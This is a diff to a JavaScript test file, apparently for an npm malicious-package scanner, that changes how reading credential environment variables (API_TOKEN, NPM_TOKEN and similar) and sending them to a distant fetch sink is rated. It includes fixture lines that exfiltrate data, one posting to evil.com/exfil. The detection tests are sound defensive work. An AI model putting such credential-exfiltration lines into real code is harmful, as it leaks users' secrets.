@@ -817,7 +817,29 @@ fetch('https://evil.com/exfil', { body: h });`;
   // HIGH → MEDIUM graduation for env/telemetry-only distant sources
   // ==========================================================================
 
-  await asyncTest('DATAFLOW graduation: env_read only + distant sink → MEDIUM', async () => {
+  await asyncTest('DATAFLOW graduation: env_read only (non-credential) + distant sink → MEDIUM', async () => {
+    // Audit 2026-05 DF-C4: non-credential env vars (system identity like HOME) still
+    // graduate HIGH→MEDIUM when paired with a distant sink — fingerprinting is FP-prone
+    // when far from the sink. Credential-tier env vars now have a separate path (see
+    // DF-C4 regression test below).
+    const lines = [];
+    lines.push(`const home = process.env.HOME;`);
+    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
+    lines.push(`fetch('https://api.example.com', { headers: { 'X-Home': home } });`);
+    const tmp = makeTempPkg(lines.join('\n'));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect suspicious_dataflow');
+      assert(t.severity === 'MEDIUM', `env_read (HOME, non-credential) + distant sink should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW graduation: credential_env_read (API_TOKEN) + distant sink → HIGH (DF-C4)', async () => {
+    // Audit 2026-05 DF-C4: credential-tier env vars (NPM_TOKEN, GITHUB_TOKEN, API_TOKEN,
+    // AWS_SECRET_*) are classified as credential_env_read and participate in
+    // hasHighRiskSource — they retain HIGH severity even with a distant sink, preventing
+    // Mini Shai-Hulud-style payloads from slipping below the MEDIUM FP gates.
     const lines = [];
     lines.push(`const token = process.env.API_TOKEN;`);
     for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
@@ -827,7 +849,7 @@ fetch('https://evil.com/exfil', { body: h });`;
       const result = await runScanDirect(tmp);
       const t = result.threats.find(t => t.type === 'suspicious_dataflow');
       assert(t, 'Should detect suspicious_dataflow');
-      assert(t.severity === 'MEDIUM', `env_read only + distant sink should be MEDIUM, got ${t.severity}`);
+      assert(t.severity === 'HIGH', `credential_env_read (API_TOKEN) + distant sink should be HIGH, got ${t.severity}`);
     } finally { cleanupTemp(tmp); }
   });
 
